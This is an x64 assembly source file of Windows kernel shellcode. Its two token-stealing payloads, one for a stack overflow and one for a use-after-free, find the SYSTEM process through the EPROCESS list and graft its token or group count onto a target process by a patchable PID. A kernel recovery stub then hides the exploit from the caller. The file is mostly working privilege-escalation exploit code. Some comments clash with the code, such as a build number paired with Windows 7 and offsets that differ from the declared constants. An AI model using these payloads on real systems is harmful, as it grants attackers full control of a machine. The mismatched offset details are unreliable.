; Copyright (c) 2015-2016, tandasat. All rights reserved.
; Use of this source code is governed by a MIT-style license that can be
; found in the LICENSE file.

;
; This module implements all assembler code
;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
; References to C functions
;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
; constants
;

.CONST
;// Windows 7 Kernel Version 15063 MP (1 procs) Free x64
KTHREAD_OFFSET   EQU   124h  ;// nt!_KPCR.PcrbData.CurrentThread
EPROCESS_OFFSET  EQU   050h  ;// nt!_KTHREAD.ApcState.Process
PID_OFFSET       EQU   0B4h  ;// nt!_EPROCESS.UniqueProcessId
FLINK_OFFSET     EQU   0B8h  ;// nt!_EPROCESS.ActiveProcessLinks.Flink
TOKEN_OFFSET     EQU   0F8h  ;// nt!_EPROCESS.Token
SYSTEM_PID       EQU   004h  ;// SYSTEM Process PID


.DATA ; --- avoid using .CODE section because we need to patch PID

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
; macros
;

; Saves all general purpose registers to the stack
PUSHAQ MACRO
    push    rax
    push    rcx
    push    rdx
    push    rbx
    push    -1      ; dummy for rsp
    push    rbp
    push    rsi
    push    rdi
    push    r8
    push    r9
    push    r10
    push    r11
    push    r12
    push    r13
    push    r14
    push    r15
ENDM

; Loads all general purpose registers from the stack
POPAQ MACRO
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     r11
    pop     r10
    pop     r9
    pop     r8
    pop     rdi
    pop     rsi
    pop     rbp
    add     rsp, 8    ; dummy for rsp
    pop     rbx
    pop     rdx
    pop     rcx
    pop     rax
ENDM

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
; implementations
;
.DATA ; --- avoid using .CODE section because we need to patch PID

; https://github.com/tandasat/CVE-2014-0816/blob/master/exploit_ngs/exploit_ngs/shellcode.asm

TokenStealingPayloadStackOverflow PROC
	;db 0cch ; --- breakpoint for debug
	pushfq
	PUSHAQ	; Save registers state

	
	mov RDX, qword ptr gs:[188h]
	; > The GS points to the Kernel Processor Control Region (KPCR)
	; >  dt nt!_KPCR 	--> ..  +0x180 Prcb             : _KPRCB
	; >  dt nt!_KPRCB 	--> ..  +0x008 CurrentThread    : Ptr64 _KTHREAD
	; > RDX = (_KTHREAD*) nt!_KPCR.Pcrb.CurrentThread 
	; > double check - dt nt!_KTHREAD @RDX

	mov r8, [RDX + 0B8h] ; EPROCESS pointer (nt!_KTHREAD.ApcState.Process)
	; >  dt nt!_KTHREAD 	-->> ..   +0x098 ApcState         : _KAPC_STATE
	; >  dt nt!_KAPC_STATE	-->> ..   +0x020 Process          : Ptr64 _KPROCESS (or) _EPROCESS
	; > R8 = (_KPROCESS*) nt!_KTHREAD.ApcState.Process
	; > double check - dt nt!_EPROCESS @R8

	mov r9, [r8 + 2F0h] ; ActiveProcessLinks list head
	; > dt nt!_EPROCESS		-->> ..   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
	; > R9 = (_LIST_ENTRY) nt!_EPROCESS.ActiveProcessLinks 
	; > double check - dt nt!_LIST_ENTRY @R9

	mov RCX, [r9] ; follow link to first process in list
	; > RCX = ActiveProcessLinks.Flink
	; > double check - dt nt!_LIST_ENTRY @RCX

	find_system:
		mov RDX, [RCX-8] ; ActiveProcessLinks - 8 = UniqueProcessId
		cmp RDX, 4 ; UniqueProcessId == 4 (SYSTEM:4)?
		jz found_system ;YES - move on
		mov RCX, [RCX] ; NO - load next entry in list
		jmp find_system ; loop
	
	found_system:
		; RCX = nt!_EPROCESS.ActiveProcessLinks (offset = +0x2f0)
		; > dt nt!_EPROCESS 	-->> ..    +0x358 Token            : _EX_FAST_REF
		; 0x358 - 0x2f0  = 0x68
		; RCX + 68h = nt!_EPROCESS.token
		; > double check - dt nt!_EX_FAST_REF [@RCX+0x68]
		mov RAX, [RCX + 358h - 2f0h] ;offset to token (+0x358)
		
		and al, 0f0h ; clear _EX_FAST_REF.RefCnt, which locates low 4 bits of the structure

	find_cmd:
		mov RDX, [RCX-8] ;ActiveProcessLinks - 8 = UniqueProcessId
		
		cmp RDX, 0DDAABBEEh ; universal PID-stub

		;cmp RDX, 12F8h; cmd.exe dec 5700 for testing via VMWare with Snapshot
		
		jz found_cmd ; YES - move on
		mov RCX, [RCX] ;NO - next entry in list
		jmp find_cmd ;loop
	
	found_cmd:
		; mov [RCX + 358h - 2f0h], rax ;copy SYSTEM token over top of this process's token
		
		mov AX, word ptr [rax + 07Ch]        ;  < go to system UserAndGroupCount -field,  RAX=UserAndGroupCount;
		mov RDX, [RCX + 358h - 2f0h] ; < go to target TOKEN structure
		and dl, 0f0h                 ; clear _EX_FAST_REF.RefCnt, which locates low 4 bits of the structure
		mov word ptr [RDX + 07Ch], AX        ; < overwrite target UserAndGroupCount using system UserAndGroupCount
	
	return:  ; Kernel Recovery Stub
	
	POPAQ
	popfq ; Restore registers state

	xor     eax,eax

	mov RDI, [RSP+38h+90h] ; Irp address
	mov RSI, 0

	mov dword ptr [RSP+38h+30h+8h], 0 ; We set status = 0, because pIrp->IoStatus.Status = status;
	; > mov     eax,dword ptr [rsp+30h] (+8) because of return address
	
	mov dword ptr [RSP+38h+34h+8h], 0
	; > mov     ecx,dword ptr [rsp+34h]  (+8) because of return address
	; > pIrp->IoStatus.Information = info;
	

	add     rsp, 38h ; Restore stack state
	ret

TokenStealingPayloadStackOverflow ENDP

 

TokenStealingPayloadUAF PROC
	;db 0cch ; --- breakpoint for debug
	pushfq
	PUSHAQ	; Save registers state

	

	mov RDX, qword ptr gs:[188h]
	; dt nt!_KTHREAD @RDX
	;mov rdx, [gs:188h] ; KTHREAD pointer (// 0x188 = nt!_KPCR.PcrbData.CurrentThread)
	; RDX = (_KTHREAD*) nt!_KPCR.PcrbData.CurrentThread 

	mov r8, [RDX + 0B8h] ; EPROCESS pointer (nt!_KTHREAD.ApcState.Process)
	; dt nt!_EPROCESS @R8
	; R8 = (_KPROCESS*) nt!_KTHREAD.ApcState.Process

	mov r9, [r8 + 2E8h] ; ActiveProcessLinks list head
	; dt nt!_LIST_ENTRY @R9
	; R9 = (_LIST_ENTRY) nt!_EPROCESS.ActiveProcessLinks 

	mov RCX, [r9] ; follow link to first process in list
	; dt nt!_LIST_ENTRY @RCX
	;RCX = ActiveProcessLinks.Flink

	find_system:
		mov RDX, [RCX-8] ; ActiveProcessLinks - 8 = UniqueProcessId
		cmp RDX, 4 ;UniqueProcessId == 4?
		jz found_system ;YES - move on
		mov RCX, [RCX] ;NO - load next entry in list
		jmp find_system ; loop
	
	found_system:
		; RCX = nt!_EPROCESS.ActiveProcessLinks (offset = +0x2f0)
		; nt!_EPROCESS.token (offset = +0x358)
		; 0x358 - 0x2e8  = 0x70
		; RCX + 68h = nt!_EPROCESS.token
		mov RAX, [RCX + 70h] ;offset to token (+0x358)
		; RAX = content of nt!_EX_FAST_REF

		and al, 0f0h ;clear low 4 bits of _EX_FAST_REF structure

	find_cmd:
		mov RDX, [RCX-8] ;ActiveProcessLinks - 8 = UniqueProcessId
		
		cmp RDX, 0DDAABBEEh ; universal

		;cmp RDX, 1644h; cmd.exe dec 5700 for testing via VMWare with Snapshot
		

		jz found_cmd ;YES - move on
		mov RCX, [RCX] ;NO - next entry in list
		jmp find_cmd ;loop
	
	found_cmd:
		mov [RCX + 70h], rax ;copy SYSTEM token over top of this process's token
	
	return:  ; Kernel Recovery Stub
	
	POPAQ
	popfq ; Restore registers state

	ret ;; // No Need of Kernel Recovery as we are not corrupting anything

TokenStealingPayloadUAF ENDP

PURGE PUSHAQ
PURGE POPAQ
END